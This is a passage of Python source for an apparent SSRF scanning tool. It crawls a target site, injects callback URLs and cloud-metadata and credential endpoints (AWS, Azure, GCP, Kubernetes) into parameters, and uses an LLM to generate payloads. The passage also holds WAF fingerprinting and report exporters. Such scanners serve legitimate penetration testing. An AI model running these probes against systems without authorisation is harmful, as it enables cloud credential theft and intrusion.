            (r'192\.168\.\d{1,3}\.\d{1,3}', 'Internal IP', 'high'),
        ]
        matched = []
        combined = (body + json.dumps(headers)).lower()
        for pat, desc, sev in patterns:
            if re.search(pat, combined, re.I):
                matched.append(f"[{sev.upper()}] {desc}")
        if self.cb and self.cb in body:
            matched.append("[CRITICAL] Callback in response")
        if matched:
            sev_order = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3}
            sev = min(sev_order.get(p.split("]")[0].replace("[",""),3) for p in matched)
            sev_map = {0:"critical",1:"high",2:"medium",3:"low"}
            ev = SSRFEvidence(phase=phase, technique=technique, url=url, endpoint=endpoint, param=param,
                              payload=payload, status=status, body_snippet=body[:300],
                              matched_patterns=matched, severity=sev_map.get(sev,"info"))
            ev.impact_score = self._impact(ev)
            self.evidence.append(ev)
            ips = re.findall(r'(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})', body)
            for ip in ips: self.internal_ips.add(ip[0])
            return [ev]
        return []

    def _impact(self, ev):
        score = 0.0
        if ev.out_of_band_hit:
            score += 3
        if any("token" in p.lower() for p in ev.matched_patterns):
            score += 4
        elif any("metadata" in p.lower() for p in ev.matched_patterns):
            score += 2
        if re.search(r'(10\.|172\.(1[6-9]|2[0-9]|3[0-1])|192\.168\.)', ev.url):
            score += 3
        return min(score, 10.0)

    async def test_payload(self, ep, param, payload, phase, technique):
        if not isinstance(payload, str):
            payload = str(payload)

        payload = payload.strip()

        if not payload:
            return False

        if ep.method == "GET":
            sep = "&" if "?" in ep.path else "?"
            url = f"{self.base}{ep.path}{sep}{param}={urllib.parse.quote(payload)}"
            self._register_callback_context(payload, ep.path, param, phase, technique)
            status, body, headers = await self.request("GET", url)
        else:
            url = f"{self.base}{ep.path}"
            self._register_callback_context(payload, ep.path, param, phase, technique)
            status, body, headers = await self.request("POST", url, {param: payload})

        findings = await self.check_evidence(
            phase,
            technique,
            url,
            ep.path,
            param,
            payload,
            status,
            body,
            headers,
        )

        error = headers.get("_error") if isinstance(headers, dict) else None
        vulnerable = bool(findings)

        if vulnerable:
            best = findings[0]
            result = "vulnerable"
            severity = best.severity
            confidence = "high" if best.out_of_band_hit else "medium"
            matched_patterns = best.matched_patterns
        elif error:
            result = "error"
            severity = "info"
            confidence = "low"
            matched_patterns = []
        else:
            result = "not_confirmed"
            severity = "info"
            confidence = "low"
            matched_patterns = []

        self.scan_attempts.append(
            ScanAttempt(
                phase=phase,
                technique=technique,
                target=self.target,
                tested_url=url,
                endpoint=ep.path,
                param=param,
                payload=payload,
                status=status,
                vulnerable=vulnerable,
                result=result,
                severity=severity,
                confidence=confidence,
                matched_patterns=matched_patterns,
                error=error,
            )
        )

        if self.verbose:
            if vulnerable:
                for finding in findings:
                    color = {
                        "critical": RED,
                        "high": YELLOW,
                        "medium": MAGENTA,
                    }.get(finding.severity, BLUE)
                    print(
                        f"  {color}[{finding.severity.upper()}]{RESET} "
                        f"{ep.path} → {param} payload={payload} "
                        f"(impact {finding.impact_score:.1f})"
                    )
            elif error:
                print(f"  {DIM}[ERROR]{RESET} {ep.path} → {param} payload={payload} error={error}")
            else:
                print(f"  {DIM}[NOT CONFIRMED]{RESET} {ep.path} → {param} payload={payload}")

        return vulnerable

    async def discover(self):
        if self.verbose: print(f"\n{CYAN}[DISCOVERY]{RESET} Crawling and extracting endpoints...")
        static_paths = ["/","/api","/proxy","/fetch","/graphql","/health","/ws","/socket","/grpc","/k8s"]
        crawled_paths = set(static_paths)
        try:
            await self.page.goto(self.base, wait_until="networkidle", timeout=20000)
            extracted = await self.page.evaluate("""() => {
                const paths = new Set();
                document.querySelectorAll('a[href]').forEach(a => {
                    try {
                        const u = new URL(a.href, document.baseURI);
                        if (u.origin === document.location.origin) paths.add(u.pathname + u.search);
                    } catch(e) {}
                });
                document.querySelectorAll('form[action]').forEach(f => {
                    try {
                        const u = new URL(f.action, document.baseURI);
                        if (u.origin === document.location.origin) paths.add(u.pathname);
                    } catch(e) {}
                });
                document.querySelectorAll('script[src]').forEach(s => {
                    try {
                        const u = new URL(s.src, document.baseURI);
                        if (u.origin === document.location.origin) paths.add(u.pathname);
                    } catch(e) {}
                });
                document.querySelectorAll('iframe[src]').forEach(i => {
                    try {
                        const u = new URL(i.src, document.baseURI);
                        if (u.origin === document.location.origin) paths.add(u.pathname);
                    } catch(e) {}
                });
                return Array.from(paths).slice(0, 50);
            }""")
            crawled_paths.update(extracted)
        except Exception as e:
            if self.verbose: print(f"  {WARN} Crawling error: {e}")
        for p in crawled_paths:
            try:
                url = f"{self.base}{p}"
                s, b, h = await self.request("GET", url, timeout=8000)
                if s not in (0,404,403):
                    params = set(re.findall(r'[?&]([a-zA-Z_]\w*)=', p))
                    params.update(re.findall(r'name=["\']([^"\']+)["\']', b, re.I))
                    self.params.update(params)
                    ep = DiscoveredEndpoint(path=p, method="GET", params=params,
                                            accepts_url_param=True, test_response_code=s,
                                            content_type=h.get("content-type",""))
                    self.endpoints.append(ep)
                    if self.verbose and s != 200: print(f"  {DIM}[{s}]{RESET} {p}")
            except: pass
        if self.verbose: print(f"  {OK} Found {len(self.endpoints)} endpoints")

    async def detect_cloud(self):
        if self.verbose: print(f"\n{CYAN}[CLOUD]{RESET} Detecting cloud provider...")
        s, b, h = await self.request("GET", self.base)
        body_low = b.lower()
        indicators = {"AWS":["x-amz-request-id","ec2"],"GCP":["x-goog-","metadata.google.internal"],
                      "Azure":["x-ms-request-id"],"Alibaba":["aliyungf"]}
        self.cloud = [c for c, pats in indicators.items() if any(p in body_low or p in str(h).lower() for p in pats)]
        if self.verbose:
            if self.cloud: print(f"  {YELLOW}{', '.join(self.cloud)}{RESET}")
            else: print(f"  {OK} No specific cloud detected")

    def _callback_host(self) -> str:
        return self.cb.replace("https://", "").replace("http://", "").strip("/").lower()

    def make_callback_url(self, tag: str = "ssrf", scheme: str = "http") -> str:
        host = self._callback_host()
        token = random.randint(100000, 999999)
        return f"{scheme}://{tag}-{token}.{host}"

    def _register_callback_context(self, payload: str, endpoint: str, param: str, phase: str, technique: str):
        try:
            parsed = urllib.parse.urlparse(payload)
            payload_host = (parsed.hostname or "").lower()
            if not payload_host:
                return
            self.callback_context[payload_host] = {
                "endpoint": endpoint,
                "param": param,
                "payload": payload,
                "phase": phase,
                "technique": technique,
                "created_at": datetime.now().isoformat(),
            }
        except Exception:
            return

    def _find_callback_context(self, request_host: str) -> Dict:
        request_host = (request_host or "").lower()
        for payload_host, ctx in self.callback_context.items():
            if request_host == payload_host or request_host.endswith("." + payload_host):
                return ctx
        return {}

    async def basic(self):
        if self.verbose: print(f"\n{CYAN}[BASIC]{RESET} Testing common SSRF parameters...")
        for ep in self.endpoints[:5]:
            for param in ["url","uri","file","path","redirect"]:
                payload = self.make_callback_url("basic")
                await self.test_payload(ep, param, payload, "Basic", f"param {param}")

    async def run_ai_phases(self):
        if not self.ai or not self.ai.enabled:
            return

        if self.verbose:
            print(f"\n{PURPLE}[AI PHASES]{RESET} AI-powered analysis...")

        context = {
            "target": self.target,
            "waf": self.waf_info.get("primary", ""),
            "cloud": ",".join(self.cloud),
            "callback_host": self._callback_host(),
            "endpoints": [e.path for e in self.endpoints[:5]],
            "params": sorted(list(self.params))[:20],
        }

        payloads = await self.ai.generate_payloads(context)
        ai_payloads = getattr(self.ai, "last_llm_payloads", [])

        if payloads:
            safe_target = re.sub(r'[^a-zA-Z0-9.-]', '_', self.target)
            payload_log = self.output_dir / f"ai_payloads_{safe_target}.json"

            with open(payload_log, "w", encoding="utf-8") as f:
                json.dump(
                    {
                        "target": self.target,
                        "provider": self.llm.provider if self.llm else None,
                        "model": self.llm.model if self.llm else None,
                        "ai_usage": getattr(self.llm, "last_usage", {}) if self.llm else {},
                        "ai_error": getattr(self.llm, "last_error", None) if self.llm else None,
                        "ai_generated_payloads": ai_payloads,
                        "all_payloads_used": payloads,
                        "tested_payloads": payloads[:10],
                    },
                    f,
                    indent=2,
                    ensure_ascii=False,
                )

            if self.verbose:
                print(f"  {AI_ICON} Generated {len(ai_payloads)} AI payloads")
                print(f"  {AI_ICON} Total payload candidates: {len(payloads)}")
                usage = getattr(self.llm, "last_usage", {}) if self.llm else {}
                if usage:
                    print(f"  {AI_ICON} Sheep served_by={usage.get('served_by')} tokens_used={usage.get('tokens_used')}")
                print(f"  {OK} AI payloads saved: {payload_log}")
                if ai_payloads:
                    print(f"  {AI_ICON} AI-generated payloads:")
                    for i, payload in enumerate(ai_payloads, 1):
                        print(f"    [{i:02d}] {payload}")

        if self.endpoints and payloads:
            ep = self.endpoints[0]
            param = list(ep.params)[0] if ep.params else "url"
            for payload in payloads[:10]:
                await self.test_payload(ep, param, payload, "AI-Generated", "AI Payload")

        await self.run_ai_suggested_tests(context)

        if self.scan_attempts:
            summary_data = [
                {
                    "target": attempt.target,
                    "endpoint": attempt.endpoint,
                    "param": attempt.param,
                    "payload": attempt.payload,
                    "tested_url": attempt.tested_url,
                    "status": attempt.status,
                    "result": attempt.result,
                    "vulnerable": attempt.vulnerable,
                    "severity": attempt.severity,
                    "confidence": attempt.confidence,
                    "matched_patterns": attempt.matched_patterns or [],
                    "error": attempt.error,
                }
                for attempt in self.scan_attempts[:30]
            ]

            triage = await self.ai.triage(summary_data)
            if triage:
                safe_target = re.sub(r'[^a-zA-Z0-9.-]', '_', self.target)
                triage_file = self.output_dir / f"ai_triage_{safe_target}.md"
                with open(triage_file, "w", encoding="utf-8") as f:
                    f.write(triage)

                if self.verbose:
                    print(f"  {AI_ICON} AI Triage saved: {triage_file}")
                    print(f"  {AI_ICON} AI Triage:\n    {triage[:300]}...")

    async def run_ai_suggested_tests(self, context):
        if not self.ai or not self.ai.enabled:
            return

        suggestions = await self.ai.suggest_additional_tests(context)
        self.ai_suggestions = suggestions

        if not suggestions:
            return

        safe_target = re.sub(r'[^a-zA-Z0-9.-]', '_', self.target)
        suggestions_file = self.output_dir / f"ai_suggestions_{safe_target}.json"

        with open(suggestions_file, "w", encoding="utf-8") as f:
            json.dump(
                {
                    "target": self.target,
                    "provider": self.llm.provider if self.llm else None,
                    "model": self.llm.model if self.llm else None,
                    "suggestions": suggestions,
                },
                f,
                indent=2,
                ensure_ascii=False,
            )

        if self.verbose:
            print(f"  {AI_ICON} AI suggested {len(suggestions)} additional safe checks")
            print(f"  {OK} AI suggestions saved: {suggestions_file}")

        endpoint_map = {endpoint.path: endpoint for endpoint in self.endpoints}

        for suggestion in suggestions[:10]:
            issue_type = suggestion.get("issue_type")
            endpoint = suggestion.get("endpoint")
            param = suggestion.get("param")
            reason = suggestion.get("reason")
            safe_test_value = suggestion.get("safe_test_value") or "test"

            ep = endpoint_map.get(endpoint)
            if not ep:
                continue

            if issue_type == "ssrf":
                if not safe_test_value.startswith(("http://", "https://")):
                    safe_test_value = self.make_callback_url("ai-ssrf")

                vulnerable = await self.test_payload(
                    ep,
                    param,
                    safe_test_value,
                    "AI-Suggested",
                    "AI SSRF suggestion",
                )

                self.other_issue_attempts.append(
                    {
                        "issue_type": issue_type,
                        "endpoint": endpoint,
                        "param": param,
                        "payload": safe_test_value,
                        "reason": reason,
                        "result": "vulnerable" if vulnerable else "not_confirmed",
                    }
                )
                continue

            result = await self.safe_non_ssrf_check(
                ep,
                param,
                safe_test_value,
                issue_type,
                reason,
            )

            self.other_issue_attempts.append(result)

    async def safe_non_ssrf_check(self, ep, param, value, issue_type, reason):
        if not isinstance(value, str):
            value = str(value)

        value = value.strip() or "test"

        if ep.method == "GET":
            sep = "&" if "?" in ep.path else "?"
            tested_url = f"{self.base}{ep.path}{sep}{param}={urllib.parse.quote(value)}"
            status, body, headers = await self.request("GET", tested_url)
        else:
            tested_url = f"{self.base}{ep.path}"
            status, body, headers = await self.request("POST", tested_url, {param: value})

        body_low = (body or "").lower()
        headers_low = json.dumps(headers or {}).lower()
        evidence = []
        result = "not_confirmed"
        confidence = "low"

        if issue_type == "open_redirect":
            location = ""
            if isinstance(headers, dict):
                location = headers.get("location", "") or headers.get("Location", "")
            if value in location or value in body:
                evidence.append("Potential redirect reflection detected")
                result = "suspected_other_issue"
                confidence = "medium"

        elif issue_type == "cors_misconfig":
            acao = ""
            acac = ""
            if isinstance(headers, dict):
                acao = headers.get("access-control-allow-origin", "") or headers.get("Access-Control-Allow-Origin", "")
                acac = headers.get("access-control-allow-credentials", "") or headers.get("Access-Control-Allow-Credentials", "")
            if acao == "*" or (acao and acac.lower() == "true"):
                evidence.append("Potential CORS misconfiguration signal")
                result = "suspected_other_issue"
                confidence = "medium"

        elif issue_type == "header_injection":
            if "x-injected" in headers_low or "x-injected" in body_low:
                evidence.append("Potential header injection reflection")
                result = "suspected_other_issue"
                confidence = "medium"

        elif issue_type == "path_traversal_readonly":
            if "root:" in body_low or "windows" in body_low or "boot loader" in body_low:
                evidence.append("Potential read-only path traversal/file disclosure signal")
                result = "suspected_other_issue"
                confidence = "medium"

        elif issue_type == "information_disclosure":
            markers = ["secret", "token", "apikey", "api_key", "password", "private_key", "debug", "stack trace"]
            found = [marker for marker in markers if marker in body_low]
            if found:
                evidence.append(f"Potential information disclosure markers: {', '.join(found[:5])}")
                result = "suspected_other_issue"
                confidence = "medium"

        elif issue_type == "authz_review":
            if status in (200, 201, 202):
                evidence.append("Authorization review suggested by AI; manual validation required")
                result = "manual_review"
                confidence = "low"

        error = headers.get("_error") if isinstance(headers, dict) else None
        if error:
            result = "error"

        if self.verbose:
            print(f"  {DIM}[AI {result.upper()}]{RESET} {issue_type} {ep.path} → {param}")

        return {
            "issue_type": issue_type,
            "endpoint": ep.path,
            "param": param,
            "tested_url": tested_url,
            "payload": value,
            "status": status,
            "result": result,
            "confidence": confidence,
            "reason": reason,
            "evidence": evidence,
            "error": error,
        }

    async def phase_websocket(self):
        if self.no_ws: return
        if self.verbose: print(f"\n{PURPLE}[WebSocket SSRF (exp)]{RESET} Testing...")
        for ep in self.endpoints:
            if "ws" in ep.path.lower() or "socket" in ep.path.lower():
                for param in list(ep.params)[:3] + ["url"]:
                    payload = self.make_callback_url("ws", scheme="wss")
                    await self.test_payload(ep, param, payload, "WebSocket", f"WS via {param}")

    async def phase_grpc(self):
        if self.no_grpc or not AIOHTTP_AVAILABLE: return
        if self.verbose: print(f"\n{PURPLE}[gRPC SSRF (exp)]{RESET} Probing gRPC...")
        urls = ["/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo",
                "/grpc.reflection.v1.ServerReflection/ServerReflectionInfo",
                "/grpc.health.v1.Health/Check"]
        old_count = len(self.callbacks)
        for path in urls:
            full_url = f"{self.base}{path}"
            try:
                async with aiohttp.ClientSession() as session:
                    grpc_payload = self.make_callback_url("grpc")
                    self._register_callback_context(grpc_payload, path, "X-SSRF", "gRPC SSRF", "Header Injection")
                    headers = {"Content-Type":"application/grpc","X-SSRF": grpc_payload}
                    resp = await session.post(full_url, headers=headers, timeout=10)
                    body = await resp.text()
                    if any(kw in body.lower() for kw in ["metadata","token","access_key"]):
                        ev = SSRFEvidence(phase="gRPC SSRF", technique="gRPC Response",
                                          url=full_url, endpoint=path, param="header", payload="X-SSRF",
                                          status=resp.status, body_snippet=body[:200],
                                          matched_patterns=["[HIGH] gRPC endpoint returned sensitive data"],
                                          severity="high")
                        self.evidence.append(ev)
            except: pass
        new_callbacks = len(self.callbacks) - old_count
        if new_callbacks > 0:
            print(f"  {RED}[!] gRPC triggered {new_callbacks} callback(s){RESET}")
            ev = SSRFEvidence(phase="gRPC SSRF", technique="Header Injection",
                              url=full_url, endpoint="/grpc", param="header", payload="X-SSRF",
                              status=0, body_snippet="",
                              matched_patterns=["[CRITICAL] Blind SSRF via gRPC"],
                              severity="critical", out_of_band_hit=True)
            self.evidence.append(ev)
        else:
            if self.verbose: print(f"  {DIM}No callbacks detected{RESET}")

    async def phase_k8s(self):
        if self.no_k8s: return
        if self.verbose: print(f"\n{PURPLE}[K8s SSRF (exp)]{RESET} Testing...")
        urls = ["https://kubernetes.default.svc/api/v1/namespaces",
                "https://kubernetes.default.svc/apis/apps/v1/deployments",
                "http://169.254.169.254/latest/meta-data/"]
        for ep in self.endpoints[:5]:
            for param in list(ep.params)[:3] + ["url"]:
                for u in urls:
                    await self.test_payload(ep, param, u, "K8s SSRF", f"Targeting {u}")

    async def phase_serverless(self):
        if self.no_serverless: return
        if self.verbose: print(f"\n{PURPLE}[Serverless SSRF (exp)]{RESET} Testing...")
        targets = {"AWS Lambda":["http://169.254.170.2/v1/credentials"],
                   "Azure Functions":["http://169.254.169.254/metadata/identity/oauth2/token"],
                   "GCP Functions":["http://metadata.google.internal/"]}
        for ep in self.endpoints[:5]:
            for param in list(ep.params)[:3] + ["url"]:
                for cloud, urls in targets.items():
                    for u in urls:
                        await self.test_payload(ep, param, u, "Serverless", f"{cloud}: {u}")

    def _dedup(self):
        groups = defaultdict(lambda: {"findings":[], "max_sev":"info", "oob":0})
        sev_order = {"critical":0,"high":1,"medium":2,"low":3,"info":4}
        for f in self.evidence:
            key = (f.endpoint, f.param)
            groups[key]["findings"].append(f)
            if sev_order.get(f.severity,4) < sev_order.get(groups[key]["max_sev"],4):
                groups[key]["max_sev"] = f.severity
            if f.out_of_band_hit: groups[key]["oob"] += 1
        return dict(groups)

    def export_nuclei(self):
        if not self.do_export_nuclei: return
        templates = []
        for ev in self.evidence:
            if ev.out_of_band_hit:
                tid = f"ssrf-{ev.endpoint.replace('/','-')}-{ev.param}"
                templates.append({
                    "id": tid,
                    "info": {"name":f"SSRF on {ev.endpoint}","severity":ev.severity},
                    "requests":[{"method":"GET",
                                 "path":[f"{{{{BaseURL}}}}{ev.endpoint}?{ev.param}={{{{url}}}}"],
                                 "matchers":[{"type":"word","words":["callback"]}]}]
                })
        if templates:
            if YAML_AVAILABLE:
                with open(self.output_dir / f"nuclei_{self.target}.yaml", "w", encoding="utf-8") as f:
                    yaml.dump(templates, f, allow_unicode=True)
                print(f"  {OK} Nuclei YAML exported")
            else:
                with open(self.output_dir / f"nuclei_{self.target}.json", "w", encoding="utf-8") as f:
                    json.dump(templates, f, indent=2)
                print(f"  {WARN} PyYAML missing, exported JSON")

    def export_siem_cef(self):
        if not self.do_export_siem:
            return

        entries = []
        source = self.scan_attempts or []

        for attempt in source:
            severity = attempt.severity or "info"
            signature = "SSRF confirmed" if attempt.vulnerable else "SSRF not confirmed"
            if attempt.result == "error":
                signature = "SSRF scan error"
            cef = f"CEF:0|SSRFFramework|UltimateSSRF|4.2|SSRF_ATTEMPT|{signature}|{severity}|"
            cef += (
                f"dhost={self.target} request={attempt.tested_url} "
                f"endpoint={attempt.endpoint} param={attempt.param} "
                f"payload={attempt.payload} result={attempt.result} "
                f"vulnerable={attempt.vulnerable} status={attempt.status} "
                f"confidence={attempt.confidence}"
            )
            if attempt.error:
                cef += f" error={attempt.error}"
            entries.append(cef)

        if not entries and self.evidence:
            for ev in self.evidence:
                cef = f"CEF:0|SSRFFramework|UltimateSSRF|4.2|SSRF_FINDING|SSRF|{ev.severity}|"
                cef += f"dhost={self.target} request={ev.url} endpoint={ev.endpoint} param={ev.param} payload={ev.payload} outOfBand={ev.out_of_band_hit} score={ev.impact_score}"
                entries.append(cef)

        for item in self.other_issue_attempts:
            cef = f"CEF:0|SSRFFramework|4.2|AI-Suggested|{item.get('issue_type')}|{item.get('result')}|"
            cef += f"target={self.target} endpoint={item.get('endpoint')} param={item.get('param')} result={item.get('result')} confidence={item.get('confidence')}"
            entries.append(cef)

        safe_target = re.sub(r'[^a-zA-Z0-9.-]', '_', self.target)
        cef_file = self.output_dir / f"siem_{safe_target}.cef"
        with open(cef_file, "w", encoding="utf-8") as f:
            f.write("\n".join(entries))
        if self.verbose:
            print(f"  {OK} CEF exported: {cef_file}")

    def export_json_api(self):
        if not self.do_export_json_api:
            return

        attempts = [asdict(attempt) for attempt in self.scan_attempts]
        vulnerable_attempts = [attempt for attempt in attempts if attempt.get("vulnerable")]
        error_attempts = [attempt for attempt in attempts if attempt.get("result") == "error"]
        not_confirmed_attempts = [attempt for attempt in attempts if attempt.get("result") == "not_confirmed"]

        data = {
            "target": self.target,
            "timestamp": datetime.now().isoformat(),
            "cloud": self.cloud,
            "is_vulnerable_to_ssrf": bool(vulnerable_attempts),
            "status": "vulnerable" if vulnerable_attempts else "not_confirmed",
            "total_findings": len(self.evidence),
            "unique_findings": len(self._dedup()),
            "callbacks": len(self.callbacks),
            "attempt_summary": {
                "total": len(attempts),
                "vulnerable": len(vulnerable_attempts),
                "not_confirmed": len(not_confirmed_attempts),
                "errors": len(error_attempts),
            },
            "vulnerable_payloads": vulnerable_attempts,
            "not_confirmed_payloads": not_confirmed_attempts,
            "errors": error_attempts,
            "ai_suggestions": self.ai_suggestions,
            "other_issue_attempts": self.other_issue_attempts,
        }

        safe_target = re.sub(r'[^a-zA-Z0-9.-]', '_', self.target)
        report_file = self.output_dir / f"api_report_{safe_target}.json"
        with open(report_file, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False, default=str)
        if self.verbose:
            print(f"  {OK} JSON API exported: {report_file}")

    def generate_attack_map(self):
        if not self.do_attack_map:
            return
        if not NETWORKX_AVAILABLE:
            if self.verbose:
                print(f"{WARN} networkx missing")
            return

        G = nx.Graph()
        G.add_node(self.target, type="target", status="vulnerable" if self.evidence else "not_confirmed")

        for ip in sorted(self.internal_ips):
            G.add_node(ip, type="internal")
            G.add_edge(self.target, ip, relation="internal-reference")

        for index, attempt in enumerate(self.scan_attempts[:200], 1):
            attempt_id = f"attempt-{index}"
            G.add_node(
                attempt_id,
                type="attempt",
                endpoint=attempt.endpoint,
                param=attempt.param,
                payload=attempt.payload,
                result=attempt.result,
                vulnerable=str(attempt.vulnerable),
                status=str(attempt.status),
            )
            G.add_edge(self.target, attempt_id, relation="tested")

            if attempt.vulnerable:
                payload_id = f"payload-{index}"
                G.add_node(payload_id, type="payload", value=attempt.payload, severity=attempt.severity)
                G.add_edge(attempt_id, payload_id, relation="confirmed-payload")

        for index, item in enumerate(self.other_issue_attempts[:100], 1):
            issue_id = f"ai-issue-{index}"
            G.add_node(
                issue_id,
                type="ai_suggested_check",
                issue_type=str(item.get("issue_type")),
                endpoint=str(item.get("endpoint")),
                param=str(item.get("param")),
                result=str(item.get("result")),
                confidence=str(item.get("confidence")),
            )
            G.add_edge(self.target, issue_id, relation="ai-suggested-check")

        safe_target = re.sub(r'[^a-zA-Z0-9.-]', '_', self.target)
        graph_file = self.output_dir / f"attack_map_{safe_target}.gexf"
        nx.write_gexf(G, graph_file)
        if self.verbose:
            print(f"  {OK} Attack map exported: {graph_file}")

    async def generate_html(self):
        if not JINJA2_AVAILABLE:
            return

        deduped = self._dedup()
        vulns = [
            {
                "endpoint": ep or "unknown",
                "param": param or "callback",
                "severity": info["max_sev"],
                "oob": info["oob"],
            }
            for (ep, param), info in deduped.items()
        ]

        attempts = [asdict(attempt) for attempt in self.scan_attempts[:300]]
        vulnerable = any(attempt.get("vulnerable") for attempt in attempts)
        errors = [attempt for attempt in attempts if attempt.get("result") == "error"]
        not_confirmed = [attempt for attempt in attempts if attempt.get("result") == "not_confirmed"]

        html = Template("""
<!DOCTYPE html>
<html>
<head>
<title>SSRF Report - {{target}}</title>
<style>
body{font-family:Arial;background:#1a1a2e;color:#eee;padding:20px}
.header{background:linear-gradient(135deg,#667eea,#764ba2);padding:30px;border-radius:10px;margin-bottom:20px}
.card{background:#16213e;padding:20px;border-radius:10px;margin:10px 0}
.critical{color:#ff4444}.high{color:#ff8c00}.medium{color:#ffd700}.info{color:#8ab4f8}
table{width:100%;border-collapse:collapse;font-size:13px}th{background:#0f3460;padding:10px;text-align:left}
td{padding:8px;border-bottom:1px solid #333;vertical-align:top;word-break:break-word}
.badge{padding:4px 8px;border-radius:4px;font-size:12px;display:inline-block}
.badge-critical{background:#ff4444;color:#fff}.badge-high{background:#ff8c00;color:#fff}.badge-medium{background:#ffd700;color:#000}.badge-info{background:#444;color:#fff}
.badge-vulnerable{background:#ff4444;color:#fff}.badge-not_confirmed{background:#555;color:#fff}.badge-error{background:#8b0000;color:#fff}.badge-suspected_other_issue{background:#d97706;color:#fff}.badge-manual_review{background:#2563eb;color:#fff}
code{color:#9cdcfe}
</style>
</head>
<body>
<div class="header">
<h1>SSRF Scan Report</h1>
<p>Target: <strong>{{target}}</strong></p>
<p>Date: {{date}}</p>
<p>Status: {% if vulnerable %}<span class="badge badge-vulnerable">VULNERABLE / CONFIRMED SIGNAL</span>{% else %}<span class="badge badge-not_confirmed">NOT CONFIRMED</span>{% endif %}</p>
</div>
<div class="card"><h2>Summary</h2><p>Cloud: {{cloud}}</p><p>Endpoints: {{endpoints}}</p><p>Findings: {{findings}} raw / {{unique}} unique</p><p>Callbacks: {{callbacks}}</p><p>Total Attempts: {{attempts|length}}</p><p>Not Confirmed: {{not_confirmed|length}}</p><p>Errors: {{errors|length}}</p></div>
<div class="card"><h2>Confirmed Findings</h2><table><tr><th>Endpoint</th><th>Parameter</th><th>Severity</th><th>Callbacks</th></tr>{% for v in vulns %}<tr><td>{{v.endpoint}}</td><td>{{v.param}}</td><td><span class="badge badge-{{v.severity}}">{{v.severity.upper()}}</span></td><td>{{v.oob}}</td></tr>{% endfor %}</table></div>
<div class="card"><h2>Payload Attempts</h2><table><tr><th>Result</th><th>Status</th><th>Endpoint</th><th>Param</th><th>Payload</th><th>Evidence / Error</th></tr>{% for a in attempts %}<tr><td><span class="badge badge-{{a.result}}">{{a.result}}</span></td><td>{{a.status}}</td><td>{{a.endpoint}}</td><td>{{a.param}}</td><td><code>{{a.payload}}</code></td><td>{% if a.matched_patterns %}{{a.matched_patterns | join(", ") }}{% elif a.error %}{{a.error}}{% else %}No SSRF evidence confirmed for this payload.{% endif %}</td></tr>{% endfor %}</table></div>
<div class="card"><h2>AI Suggested Safe Checks</h2><table><tr><th>Issue Type</th><th>Result</th><th>Status</th><th>Endpoint</th><th>Param</th><th>Evidence / Reason</th></tr>{% for item in other_issue_attempts %}<tr><td>{{item.issue_type}}</td><td><span class="badge badge-{{item.result}}">{{item.result}}</span></td><td>{{item.status}}</td><td>{{item.endpoint}}</td><td>{{item.param}}</td><td>{% if item.evidence %}{{item.evidence | join(", ") }}{% else %}{{item.reason}}{% endif %}</td></tr>{% endfor %}</table></div>
</body>
</html>
        """).render(
            target=self.target,
            date=datetime.now().strftime("%Y-%m-%d %H:%M"),
            cloud=", ".join(self.cloud) if self.cloud else "Unknown",
            endpoints=len(self.endpoints),
            findings=len(self.evidence),
            unique=len(deduped),
            callbacks=len(self.callbacks),
            vulns=vulns,
            attempts=attempts,
            vulnerable=vulnerable,
            errors=errors,
            not_confirmed=not_confirmed,
            other_issue_attempts=self.other_issue_attempts,
        )

        with open(self.html_file, "w", encoding="utf-8") as f:
            f.write(html)
        if self.verbose:
            print(f"  {OK} HTML report: {self.html_file}")

    async def save_json(self):
        vulnerable = any(attempt.vulnerable for attempt in self.scan_attempts)
        data = {
            "target": self.target,
            "time": datetime.now().isoformat(),
            "cloud": self.cloud,
            "is_vulnerable_to_ssrf": vulnerable,
            "status": "vulnerable" if vulnerable else "not_confirmed",
            "endpoints": [
                {"path": e.path, "method": e.method, "params": list(e.params)}
                for e in self.endpoints
            ],
            "attempts": [asdict(attempt) for attempt in self.scan_attempts],
            "evidence": [asdict(ev) for ev in self.evidence],
            "callbacks": dict(self.callbacks),
            "internal_ips": list(self.internal_ips),
            "ai_suggestions": self.ai_suggestions,
            "other_issue_attempts": self.other_issue_attempts,
        }
        with open(self.json_file, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False, default=str)

    def print_summary(self, report_generated=True):
        deduped = self._dedup()
        vulnerable = any(attempt.vulnerable for attempt in self.scan_attempts) or bool(self.evidence)
        errors = sum(1 for attempt in self.scan_attempts if attempt.result == "error")
        not_confirmed = sum(1 for attempt in self.scan_attempts if attempt.result == "not_confirmed")
        print(f"\n{BOLD}{GREEN}{'='*50}{RESET}")
        print(f"{BOLD}{GREEN}  SCAN COMPLETE - {self.target}{RESET}")
        print(f"{BOLD}{GREEN}{'='*50}{RESET}")
        print(f"  Status: {'vulnerable' if vulnerable else 'not_confirmed'}")
        print(f"  Cloud: {', '.join(self.cloud) if self.cloud else 'Unknown'}")
        print(f"  Endpoints: {len(self.endpoints)}")
        print(f"  Attempts: {len(self.scan_attempts)} total / {not_confirmed} not confirmed / {errors} errors")
        print(f"  Findings: {len(self.evidence)} raw / {len(deduped)} unique")
        print(f"  Callbacks: {len(self.callbacks)}")
        for (ep, param), info in list(deduped.items())[:10]:
            sev = info["max_sev"]
            col = {"critical":RED,"high":YELLOW,"medium":MAGENTA}.get(sev, BLUE)
            print(f"  {col}[{sev.upper()}]{RESET} {ep} → {param} ({info['oob']} callbacks)")
        if report_generated:
            print(f"\n  {DIM}Report: {self.html_file}{RESET}")
            print(f"  {DIM}Results: {self.json_file}{RESET}")
        else:
            print(f"\n  {DIM}No report generated.{RESET}")

    async def run(self):
        print(f"\n{BOLD}{'='*50}{RESET}")
        print(f"{BOLD}Target:{RESET} {self.target}")
        print(f"{BOLD}Callback:{RESET} {self.cb}")
        if self.dangerous_payloads:
            print(f"{BOLD}{RED}DANGEROUS payloads enabled!{RESET}")
        print(f"{BOLD}{'='*50}{RESET}")
        await self.start()
        try:
            await self.discover()
            if not self.no_waf:
                s, b, h = await self.request("GET", self.base)
                self.waf_info = self.waf.fingerprint(h, b)
                if self.verbose:
                    if self.waf_info.get("detected"):
                        print(f"\n{CYAN}[WAF]{RESET} Detected: {YELLOW}{self.waf_info['primary']}{RESET} ({self.waf_info['confidence']:.0f}%)")
